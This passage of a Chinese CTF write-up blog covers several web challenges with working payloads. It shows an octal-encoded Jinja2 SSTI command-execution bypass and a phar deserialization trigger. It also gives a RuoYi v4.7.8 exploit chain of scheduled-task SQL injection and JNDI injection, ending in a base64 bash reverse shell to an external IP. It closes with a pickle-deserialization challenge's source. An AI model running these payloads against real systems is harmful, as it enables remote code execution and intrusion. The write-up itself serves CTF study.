<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li><li style="color: rgb(153, 153, 153);">33</li><li style="color: rgb(153, 153, 153);">34</li><li style="color: rgb(153, 153, 153);">35</li><li style="color: rgb(153, 153, 153);">36</li><li style="color: rgb(153, 153, 153);">37</li><li style="color: rgb(153, 153, 153);">38</li><li style="color: rgb(153, 153, 153);">39</li><li style="color: rgb(153, 153, 153);">40</li><li style="color: rgb(153, 153, 153);">41</li><li style="color: rgb(153, 153, 153);">42</li><li style="color: rgb(153, 153, 153);">43</li><li style="color: rgb(153, 153, 153);">44</li><li style="color: rgb(153, 153, 153);">45</li><li style="color: rgb(153, 153, 153);">46</li><li style="color: rgb(153, 153, 153);">47</li><li style="color: rgb(153, 153, 153);">48</li><li style="color: rgb(153, 153, 153);">49</li><li style="color: rgb(153, 153, 153);">50</li><li style="color: rgb(153, 153, 153);">51</li><li style="color: rgb(153, 153, 153);">52</li><li style="color: rgb(153, 153, 153);">53</li><li style="color: rgb(153, 153, 153);">54</li><li style="color: rgb(153, 153, 153);">55</li><li style="color: rgb(153, 153, 153);">56</li><li style="color: rgb(153, 153, 153);">57</li><li style="color: rgb(153, 153, 153);">58</li><li style="color: rgb(153, 153, 153);">59</li><li style="color: rgb(153, 153, 153);">60</li><li style="color: rgb(153, 153, 153);">61</li><li style="color: rgb(153, 153, 153);">62</li><li style="color: rgb(153, 153, 153);">63</li><li style="color: rgb(153, 153, 153);">64</li><li style="color: rgb(153, 153, 153);">65</li><li style="color: rgb(153, 153, 153);">66</li><li style="color: rgb(153, 153, 153);">67</li><li style="color: rgb(153, 153, 153);">68</li><li style="color: rgb(153, 153, 153);">69</li><li style="color: rgb(153, 153, 153);">70</li><li style="color: rgb(153, 153, 153);">71</li><li style="color: rgb(153, 153, 153);">72</li><li style="color: rgb(153, 153, 153);">73</li><li style="color: rgb(153, 153, 153);">74</li><li style="color: rgb(153, 153, 153);">75</li><li style="color: rgb(153, 153, 153);">76</li><li style="color: rgb(153, 153, 153);">77</li><li style="color: rgb(153, 153, 153);">78</li><li style="color: rgb(153, 153, 153);">79</li><li style="color: rgb(153, 153, 153);">80</li><li style="color: rgb(153, 153, 153);">81</li><li style="color: rgb(153, 153, 153);">82</li><li style="color: rgb(153, 153, 153);">83</li><li style="color: rgb(153, 153, 153);">84</li><li style="color: rgb(153, 153, 153);">85</li><li style="color: rgb(153, 153, 153);">86</li><li style="color: rgb(153, 153, 153);">87</li><li style="color: rgb(153, 153, 153);">88</li><li style="color: rgb(153, 153, 153);">89</li><li style="color: rgb(153, 153, 153);">90</li><li style="color: rgb(153, 153, 153);">91</li><li style="color: rgb(153, 153, 153);">92</li><li style="color: rgb(153, 153, 153);">93</li><li style="color: rgb(153, 153, 153);">94</li><li style="color: rgb(153, 153, 153);">95</li><li style="color: rgb(153, 153, 153);">96</li><li style="color: rgb(153, 153, 153);">97</li><li style="color: rgb(153, 153, 153);">98</li><li style="color: rgb(153, 153, 153);">99</li><li style="color: rgb(153, 153, 153);">100</li><li style="color: rgb(153, 153, 153);">101</li><li style="color: rgb(153, 153, 153);">102</li><li style="color: rgb(153, 153, 153);">103</li><li style="color: rgb(153, 153, 153);">104</li><li style="color: rgb(153, 153, 153);">105</li><li style="color: rgb(153, 153, 153);">106</li><li style="color: rgb(153, 153, 153);">107</li><li style="color: rgb(153, 153, 153);">108</li><li style="color: rgb(153, 153, 153);">109</li><li style="color: rgb(153, 153, 153);">110</li><li style="color: rgb(153, 153, 153);">111</li><li style="color: rgb(153, 153, 153);">112</li><li style="color: rgb(153, 153, 153);">113</li><li style="color: rgb(153, 153, 153);">114</li><li style="color: rgb(153, 153, 153);">115</li><li style="color: rgb(153, 153, 153);">116</li><li style="color: rgb(153, 153, 153);">117</li><li style="color: rgb(153, 153, 153);">118</li><li style="color: rgb(153, 153, 153);">119</li><li style="color: rgb(153, 153, 153);">120</li><li style="color: rgb(153, 153, 153);">121</li><li style="color: rgb(153, 153, 153);">122</li><li style="color: rgb(153, 153, 153);">123</li><li style="color: rgb(153, 153, 153);">124</li><li style="color: rgb(153, 153, 153);">125</li><li style="color: rgb(153, 153, 153);">126</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:36,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>修改后缀后上传</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/a90727cb7861ee4ffda8ad6a0266959b.png" alt="image-20240904160746420"></p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/e5b2c1e198775d7e6d38c79d70e74615.png" alt="image-20240904160805540"></p> 
<p>翻翻源码看一下上传文件的存储位置。phar协议解析就行。</p> 
<pre data-index="37" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">/file.php?file=phar:///var/www/html/upload/a976285aa6d6096e9edd17db289a73a9.jpg
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:37,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/df53a8209dd4cf0a956a2c116b5e7f21.png" alt="image-20240904160849459"></p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/9a361455f2d2d4e8ebe744825320343c.png" alt="image-20240904160859490"></p> 
<h2><a name="t12"></a><a id="CNSS_1197"></a>CNSS娘の聊天室</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/1f431691c8a78aae7527c62a7e885960.png" alt="image-20240810220046553"></p> 
<p>开题，输入什么输出什么，怀疑是SSTI</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/c03f33a5ff99a391358adca416c6eb0d.png" alt="image-20240810220120021"></p> 
<p>后端是python，测一下Jinja2</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/d9515ac5275a7b893dfb86a8b597f21a.png" alt="image-20240810220211444"></p> 
<pre data-index="38" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">{<!-- -->{7*7}}
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:38,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>还真有</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/bc628c0ac125a0c659ec773b0c142b23.png" alt="image-20240810220234856"></p> 
<p>试一试最原始的payload。看看是不是上过滤了</p> 
<pre data-index="39" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">{<!-- -->{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:39,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>发现英文被过滤了。。。只过滤了26个字母，英文符号没事</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/64cfcfda51c88830f76df213ef03de15.png" alt="image-20240810220500827"></p> 
<p>思路是用八进制代替英文字母，unicode和<span class="words-blog hl-git-1" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.10283&quot;,&quot;extra&quot;:&quot;{\&quot;words\&quot;:\&quot;十六进制\&quot;}&quot;}" data-tit="十六进制" data-pretit="十六进制">十六进制</span>都会有英文出现。</p> 
<p>原始payload：</p> 
<pre data-index="40" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">{<!-- -->{''.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:40,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>转八进制</p> 
<pre data-index="41" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">.__class__转为['XXXXXX']
[0]不动
()不动
['eval']转为['XXXXXX']
('__import__("os").popen("ls /").read()')转为('XXXXXX')
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:41,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>payload:</p> 
<pre data-index="42" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">{<!-- -->{''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\154\163\040\057\042\051\056\162\145\141\144\050\051')}}
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:42,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/2d0bdba004a9d5c7429f0baaeb57e36b.png" alt="image-20240810225935599"></p> 
<p>读取flag</p> 
<pre data-index="43" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">{<!-- -->{''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\143\141\164\040\057\146\061\061\061\061\061\061\061\061\061\061\061\061\061\061\061\064\147\056\164\170\164\042\051\056\162\145\141\144\050\051')}}
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:43,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/0924f6ca3ed233b32a645849f5e25b15.png" alt="image-20240810230026637"></p> 
<h2><a name="t13"></a><a id="RuoYi_1265"></a>没有人比我更懂RuoYi</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/39f5bd2a83743e6db2ddf8ee3bec0f66.png" alt="image-20240807205532084"></p> 
<p>看题目描述，若依的版本是v4.7.7，屏蔽定时任务bean违规的字符但是没屏蔽干净，造成了漏洞。</p> 
<p>尝试了一下4.7.6 版本 任意文件下载漏洞，已经失效了。</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/de44912fe99c0936cc2f1c53016802b3.png" alt="image-20240907020508411"></p> 
<p>参考文章：</p> 
<blockquote> 
 <p><a href="https://blog.csdn.net/qq_45813980/article/details/139775272">若依4.7.8版本计划任务rce复现_若依计划任务rce-CSDN博客</a></p> 
 <p><a href="https://github.com/wy876/POC/blob/main/RuoYi/RUOYI-v4.7.8%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md">POC/RuoYi/RUOYI-v4.7.8存在远程代码执行漏洞.md at main · wy876/POC · GitHub</a></p> 
</blockquote> 
<p>这题有师傅写wp了，写的很好：<a href="https://eddiemurphy89.github.io/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/" rel="nofollow">ruoyi-v4.7.8-RCE分析 - EddieMurphy’s blog (eddiemurphy89.github.io)</a></p> 
<p>开始做题。</p> 
<p><mark><strong>第一步是计划任务sql注入</strong></mark></p> 
<p>先验证一下4.7.8计划任务sql注入</p> 
<pre data-index="44" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'test~' WHERE job_id = 1;')
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:44,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/ef36be7ed0da6fa8a674bc4780f66925.png" alt="image-20240907022631963"></p> 
<p>payload中的sql语句以及被执行，作用是修改id为1的计划任务的值为<code>test~</code>。验证成功</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/3a16c515d0a901dee58d991774e00e23.png" alt="image-20240907022655650"></p> 
<p><mark><strong>第二步是计划任务命令执行</strong></mark></p> 
<p>开启监听验证漏洞 payload：</p> 
<pre data-index="45" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">javax.naming.InitialContext.lookup('ldap://124.71.147.99:1717')
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:45,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>将上面的payload进行十六进制编码：</p> 
<pre data-index="46" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3132342E37312E3134372E39393A313731372729
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:46,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>将编码后的payload带入下面的payload中：</p> 
<pre data-index="47" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3132342E37312E3134372E39393A313731372729 WHERE job_id = 2;')
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:47,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>上面payload的作用是利用之前的sql注入漏洞，修改job_id为2的计划任务内容，将该计划任务执行的命令改为我们构造好的payload。</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/6c98133f6d06e934274c9fc9c96c84a4.png" alt="image-20240907023130407"></p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/3e6ba188a7b285079aa5f82815f32449.png" alt="image-20240907023202151"></p> 
<p>更多操作-&gt;执行一次id为2的任务，收到监听</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/1b53a018da90429e605123e57ae1aae9.png" alt="image-20240907023310115"></p> 
<p>rce可行。我们接下来使用JNDI反弹shell。</p> 
<p>先下好工具：https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/releases</p> 
<pre data-index="48" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">java -jar JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuNzEuMTQ3Ljk5LzE3MTcgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 124.71.147.99
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:48,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/715be647438192c8763834e452a5e393.png" alt="image-20240907031217483"></p> 
<pre data-index="49" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">javax.naming.InitialContext.lookup('ldap://124.71.147.99:1389/remoteExploit8')
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:49,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<pre data-index="50" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3132342E37312E3134372E39393A313338392F72656D6F74654578706C6F6974382729
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:50,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<pre data-index="51" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3132342E37312E3134372E39393A313338392F72656D6F74654578706C6F6974382729 WHERE job_id = 3;')
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:51,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/10c4023c6e0c9b0f4d524d9e447f055d.png" alt="image-20240907025505515"></p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/a9626a36cd17829115f5b863b4f5238b.png" alt="image-20240907031120090"></p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/8cff3e3f2f2ef7596f6f85aa93ab58e2.png" alt="image-20240907031134727"></p> 
<p>结尾列一下若依的历史漏洞</p> 
<h2><a name="t14"></a><a id="CNSSFlag_1363"></a>CNSS娘のFlag商店</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/7e10eb36764fe8af91393c3363ab8543.png" alt="image-20240809075621948"></p> 
<p>开题，<code>/code</code>路由下载源码</p> 
<pre data-index="52" class="set-code-show prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">NAME <span class="token operator">=</span> <span class="token string">"Rich"</span>
MONEY <span class="token operator">=</span> <span class="token number">2000</span>

<span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> NAME<span class="token punctuation">,</span> MONEY
    NAME <span class="token operator">=</span> <span class="token string">"Rich"</span>
    MONEY <span class="token operator">=</span> <span class="token number">2000</span>
<div class="hljs-button {2} mddef add_def" data-title="复制" data-report-click="{&quot;spm&quot;:&quot;3001.10243&quot;}"></div></code><ul class="pre-numbering" style="opacity: 0.172824;"><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li></ul>'<button class="btn-code-notes mdeditor btn_def" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:52,&quot;runIdx&quot;:0}}">代码解读</button><div class="code-edithtml active c-box-black" data-title="运行"><div data-report-view="{&quot;spm&quot;:&quot;3001.10182&quot;,&quot;extra&quot;:{&quot;index&quot;:0,&quot;ab&quot;:&quot;exp1&quot;}}" data-report-click="{&quot;spm&quot;:&quot;3001.10182&quot;,&quot;extra&quot;:{&quot;index&quot;:0,&quot;ab&quot;:&quot;exp1&quot;}}" class="code-edithtml-box code-edithtml-box0"><i></i>运行<div><button>运行</button></div></div></div></pre> 
<pre data-index="53" class="set-code-hide prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token comment"># encoding: utf-8</span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> pickle

<span class="token keyword">import</span> buyInfo
<span class="token keyword">import</span> flask

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
flag <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">Hi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> money<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>money <span class="token operator">=</span> money

    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token keyword">and</span> self<span class="token punctuation">.</span>money <span class="token operator">==</span> other<span class="token punctuation">.</span>money


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'View code in /code to buy flag.'</span>
    <span class="token keyword">if</span> <span class="token string">'R'</span> <span class="token keyword">in</span> user<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'臭要饭的别挡我财路'</span>

    user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>user<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>name<span class="token punctuation">,</span> user<span class="token punctuation">.</span>money<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>buyInfo<span class="token punctuation">.</span>NAME<span class="token punctuation">,</span>  buyInfo<span class="token punctuation">.</span>MONEY<span class="token punctuation">)</span>
    <span class="token keyword">if</span> user <span class="token operator">==</span> Hi<span class="token punctuation">(</span>buyInfo<span class="token punctuation">.</span>NAME<span class="token punctuation">,</span>  buyInfo<span class="token punctuation">.</span>MONEY<span class="token punctuation">)</span><span class="token punctuation">:</span>
        buyInfo<span class="token punctuation">.</span>reset<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'CNSS娘最喜欢富哥啦，这是你要的flag </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>flag<span class="token punctuation">}</span></span><span class="token string">'</span></span>

    <span class="token keyword">return</span> <span class="token string">'臭要饭的别挡我财路'</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'code.zip'</span>
    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/zip'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span>

<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 